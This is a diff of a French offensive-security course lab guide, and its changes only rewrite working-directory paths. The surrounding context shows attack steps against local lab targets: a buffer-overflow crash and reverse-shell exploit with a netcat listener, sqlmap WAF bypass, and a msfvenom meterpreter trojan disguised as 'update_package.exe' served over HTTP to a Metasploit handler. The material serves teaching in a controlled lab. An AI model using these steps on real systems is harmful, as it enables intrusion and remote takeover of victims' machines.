@@ -62,7 +62,7 @@ flowchart LR
 
 | Durée | Conteneur | Dossier | Technique ATT&CK |
 |---|---|---|---|
-| 1h | buffovf-target (port 9001) | `~/cours-hacking/labs/jour-03/` | [T1068](https://attack.mitre.org/techniques/T1068/) |
+| 1h | buffovf-target (port 9001) | `rendu_labs/jour-03/` | [T1068](https://attack.mitre.org/techniques/T1068/) |
 
 ### Contexte métier
 
@@ -73,7 +73,7 @@ Les buffer overflows restent dans le top 3 des vulnérabilités critiques (MITRE
 ```bash
 # Démarre le conteneur vulnérable en arrière-plan et reconstruit l'image si nécessaire
 # -d : mode détaché (arrière-plan), --build : rebuild l'image avant de lancer
-cd ~/cours-hacking/repo && docker compose up -d --build buffovf
+docker compose up -d --build buffovf
 
 # Teste la connectivité TCP sur le port 9001 ; si le port est ouvert, affiche "OK"
 # -z : scan TCP sans envoyer de données (zero I/O mode)
@@ -85,14 +85,14 @@ nc -z localhost 9001 && echo "OK"
 pip install --break-system-packages pwntools
 
 # Crée le dossier de travail du lab (récursivement si nécessaire) et s'y déplace
-mkdir -p ~/cours-hacking/labs/jour-03 && cd ~/cours-hacking/labs/jour-03
+mkdir -p rendu_labs/jour-03 && cd rendu_labs/jour-03
 ```
 
 ### Étape 1 — Test crash
 
 ```bash
 # Se place dans le dossier du lab
-cd ~/cours-hacking/labs/jour-03
+cd rendu_labs/jour-03
 
 # Génère 100 caractères 'A' et les envoie via netcat au service vulnérable (port 9001)
 # 'A'*100 = 100 octets > buffer[64] → débordement dans saved EBP et EIP
@@ -105,7 +105,7 @@ python3 -c "print('A'*100)" | nc localhost 9001
 
 ### Étape 2 — Exploit avec reverse shell
 
-Le code source vulnérable est dans `~/cours-hacking/repo/docker/buffovf/vuln.c` :
+Le code source vulnérable est dans `docker/buffovf/vuln.c` :
 
 ```c
 void vulnerable_function(char *input) {
@@ -116,7 +116,7 @@ void vulnerable_function(char *input) {
 
 ```bash
 # Se place dans le dossier du lab
-cd ~/cours-hacking/labs/jour-03
+cd rendu_labs/jour-03
 
 # Crée le script d'exploit via un heredoc (PYEOF = marqueur de fin arbitraire)
 # << 'PYEOF' : le contenu est écrit dans exploit_bof.py jusqu'au marqueur PYEOF
@@ -204,7 +204,7 @@ nc -lvnp 4444
 
 # === Terminal 2 : Lancement de l'exploit ===
 # Se place dans le dossier contenant le script d'exploit
-cd ~/cours-hacking/labs/jour-03
+cd rendu_labs/jour-03
 # Exécute l'exploit BOF : envoie le payload (padding + EIP + NOP sled + shellcode)
 # Si réussi, le shellcode se connecte au Terminal 1 et fournit un shell interactif
 python3 exploit_bof.py
@@ -312,7 +312,7 @@ curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1%20OR%201=1"
 
 ```bash
 # Se place dans le dossier de travail du lab
-cd ~/cours-hacking/labs/jour-03
+cd rendu_labs/jour-03
 
 # Lance sqlmap contre l'application protégée par WAF avec 3 scripts d'obfuscation
 # -u : URL cible avec le paramètre à tester (id est le point d'injection)
@@ -380,7 +380,7 @@ curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1%20OR%201=1"
 
 | Durée | Conteneur | Dossier | Techniques ATT&CK |
 |---|---|---|---|
-| 1h | VM Windows 10 + Kali | `~/cours-hacking/labs/jour-03/` | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) User Execution + [T1055](https://attack.mitre.org/techniques/T1055/) Process Injection + [T1071.001](https://attack.mitre.org/techniques/T1071/001/) Web Protocols |
+| 1h | VM Windows 10 + Kali | `rendu_labs/jour-03/` | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) User Execution + [T1055](https://attack.mitre.org/techniques/T1055/) Process Injection + [T1071.001](https://attack.mitre.org/techniques/T1071/001/) Web Protocols |
 
 ### Contexte métier
 
@@ -401,7 +401,7 @@ flowchart LR
 ### Prérequis
 
 ```bash
-cd ~/cours-hacking/labs/jour-03
+cd rendu_labs/jour-03
 
 # 📌 Votre VM Windows 10 doit être allumée et sur le même réseau que Kali
 # Connectez-vous avec un compte administrateur local
@@ -425,7 +425,7 @@ ping -c 2 192.168.X.X
 ### Étape 1 — Génération du trojan avec msfvenom
 
 ```bash
-cd ~/cours-hacking/labs/jour-03
+cd rendu_labs/jour-03
 
 # 📌 msfvenom = générateur de payload de Metasploit
 # 🔍 -p windows/x64/meterpreter/reverse_https = payload 64-bit reverse HTTPS
@@ -459,7 +459,7 @@ md5sum /tmp/update_package.exe
 ### Étape 2 — Mise en place du listener Metasploit
 
 ```bash
-cd ~/cours-hacking/labs/jour-03
+cd rendu_labs/jour-03
 
 # 📌 Script de démarrage du handler Metasploit (multi/handler)
 # 🔍 use exploit/multi/handler = module générique qui attend une connexion reverse
@@ -488,7 +488,7 @@ msfconsole -q -r /tmp/listener.rc
 ### Étape 3 — Livraison et exécution du trojan
 
 ```bash
-cd ~/cours-hacking/labs/jour-03
+cd rendu_labs/jour-03
 
 # 📌 Sur Kali : servir le trojan via HTTP
 # 🔍 python3 -m http.server = serveur HTTP minimal sur le port 8080
